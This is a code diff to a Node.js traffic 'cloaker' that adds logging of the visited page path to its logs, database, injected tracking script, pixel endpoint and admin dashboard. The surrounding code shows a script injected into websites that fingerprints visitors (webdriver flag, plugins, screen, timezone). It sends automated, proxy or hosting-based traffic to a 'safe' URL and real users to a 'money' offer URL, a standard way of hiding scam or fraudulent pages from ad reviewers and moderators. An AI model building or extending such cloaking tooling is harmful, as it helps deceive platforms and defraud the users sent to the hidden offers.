@@ -63,7 +63,7 @@ function logRowToObj(row) {
     org: row.org || '', ua: row.ua || '', screen: row.screen || '',
     plugins: row.plugins != null ? row.plugins : 0,
     tz: row.tz || '', wd: !!row.wd, proxy: !!row.proxy, hosting: !!row.hosting,
-    decision: row.decision || '', reason: row.reason || ''
+    decision: row.decision || '', reason: row.reason || '', page: row.page || ''
   };
 }
 
@@ -86,12 +86,12 @@ function leadRowToObj(row) {
 function dbWriteLog(entry) {
   if (!_useDb || !_dbPool) return;
   dbq(
-    'INSERT INTO cloaker_logs(ts,ip,site_id,country,city,region,isp,org,ua,screen,plugins,tz,wd,proxy,hosting,decision,reason) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17)',
+    'INSERT INTO cloaker_logs(ts,ip,site_id,country,city,region,isp,org,ua,screen,plugins,tz,wd,proxy,hosting,decision,reason,page) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)',
     [entry.ts||new Date().toISOString(), entry.ip||'', entry.siteId||'', entry.country||'',
      entry.city||'', entry.region||'', entry.isp||'', entry.org||'',
      (entry.ua||'').slice(0,500), entry.screen||'', entry.plugins||0,
      entry.tz||'', !!entry.wd, !!entry.proxy, !!entry.hosting,
-     entry.decision||'', entry.reason||'']
+     entry.decision||'', entry.reason||'', (entry.page||'').slice(0,500)]
   ).catch(function(e) { console.error('DB log write error:', e.message); });
 }
 
@@ -161,6 +161,10 @@ async function initDb() {
       CREATE INDEX IF NOT EXISTS idx_cl_site ON cloaker_logs(site_id);
       CREATE INDEX IF NOT EXISTS idx_ld_ts   ON cloaker_leads(ts DESC);
       CREATE INDEX IF NOT EXISTS idx_ld_site ON cloaker_leads(site_id);
+    `);
+    // Safe column additions for existing tables
+    await _dbPool.query(`
+      ALTER TABLE cloaker_logs ADD COLUMN IF NOT EXISTS page VARCHAR(500) DEFAULT '';
     `);
 
     _useDb = true;
@@ -426,7 +430,8 @@ function buildCloakScript(hubUrl, apiKey) {
     + 'try{fetch(_h+\'/api/v1/pixel\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},\n'
     + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
     + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
-    + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
+    + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone,\n'
+    + 'pg:window.location.pathname})}).then(function(r){return r.json()})\n'
     + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
     + '})();\n'
     + '</script>';
@@ -863,6 +868,7 @@ app.post('/api/v1/pixel', async function(req, res) {
   var sh = parseInt(req.body.sh) || 0;
   var wd = req.body.wd === true || req.body.wd === 'true';
   var pl = parseInt(req.body.pl) || 0;
+  var pg = (req.body.pg || '').slice(0, 500);
   var screenStr = sw + 'x' + sh;
 
   var moneyUrl = settings.moneyUrl || '/offer';
@@ -874,7 +880,7 @@ app.post('/api/v1/pixel', async function(req, res) {
       country: 'XX', city: '', region: '', isp: '', org: '',
       ua: ua.slice(0, 200), screen: screenStr, plugins: pl,
       tz: tz, wd: wd, proxy: false, hosting: false,
-      decision: 'block', reason: reason
+      decision: 'block', reason: reason, page: pg
     };
     appendLog(entry);
     return res.json({ decision: 'block', url: safeUrl });
@@ -887,7 +893,7 @@ app.post('/api/v1/pixel', async function(req, res) {
       country: 'XX', city: '', region: '', isp: '', org: '',
       ua: ua.slice(0, 200), screen: screenStr, plugins: pl,
       tz: tz, wd: wd, proxy: false, hosting: false,
-      decision: 'allow', reason: 'disabled'
+      decision: 'allow', reason: 'disabled', page: pg
     });
     return res.json({ decision: 'allow', url: moneyUrl });
   }
@@ -968,7 +974,8 @@ app.post('/api/v1/pixel', async function(req, res) {
     proxy: ipData.proxy || false,
     hosting: ipData.hosting || false,
     decision: decision,
-    reason: reason
+    reason: reason,
+    page: pg
   });
 
   res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
@@ -2139,12 +2146,14 @@ function adminDashboardPage(settings, logs, leads, opts) {
     var proxyVal = l.proxy !== undefined ? boolBadge(l.proxy) : '<span style="color:var(--text3)">—</span>';
     var hostVal = l.hosting !== undefined ? boolBadge(l.hosting) : '<span style="color:var(--text3)">—</span>';
 
+    var pageDisplay = l.page ? escHtml(l.page) : '—';
     var detailHtml = '<div class="log-detail-card" id="' + detailId + '" style="display:none">'
       + '<div class="ldc-grid">'
       + ldcItem('IP Address',     escHtml(l.ip || '—'))
       + ldcItem('Full Location',  escHtml(fullLoc))
       + ldcItem('ISP',            escHtml(l.isp || '—'))
       + ldcItem('Organization',   escHtml(l.org || '—'))
+      + ldcItem('Page Visited',   l.page ? '<code style="font-size:.8rem;color:var(--pri-l)">' + pageDisplay + '</code>' : '—')
       + ldcItem('Device',         devType + ' · ' + os)
       + ldcItem('Screen',         screenStr + (screenStr !== '—' ? '' : ' (no screen reported)'))
       + ldcItem('Browser',        browser)
@@ -2165,7 +2174,7 @@ function adminDashboardPage(settings, logs, leads, opts) {
       + '<div class="log-card-inner lc-grid" onclick="toggleLogRow(\'' + detailId + '\')" title="Click to expand full details">'
       +   '<div class="lc-num">' + rowNum + '</div>'
       +   '<div class="lc-dec">' + decIconHtml + '<span class="dec-' + dec + '">' + (dec === 'allow' ? 'Allow' : 'Block') + '</span></div>'
-      +   '<div class="lc-ip">' + escHtml(l.ip || '—') + '</div>'
+      +   '<div class="lc-ip">' + escHtml(l.ip || '—') + (l.page ? '<div class="lc-page" title="' + escHtml(l.page) + '">' + escHtml(l.page.slice(0,28)) + '</div>' : '') + '</div>'
       +   locHtml
       +   deviceHtml
       +   '<div class="lc-score-wrap"><div class="lc-score-bars">' + scoreBarsHtml + '</div><span class="lc-score-val">' + score + '</span></div>'
@@ -2613,6 +2622,7 @@ body.dark .log-card:hover{box-shadow:0 4px 14px rgba(0,0,0,.28)}
 .log-dec-allow{background:linear-gradient(135deg,#22c55e,#16a34a)}
 .log-dec-block{background:linear-gradient(135deg,#ef4444,#dc2626)}
 .lc-ip{font-family:'SF Mono',Menlo,monospace;font-size:.71rem;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.lc-page{font-family:'SF Mono',Menlo,monospace;font-size:.6rem;color:var(--pri-l);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;opacity:.8}
 .lc-location{display:flex;flex-direction:column;gap:1px;min-width:0}
 .lc-location-top{display:flex;align-items:center;gap:4px}
 .lc-flag{font-size:.95rem;line-height:1;flex-shrink:0}
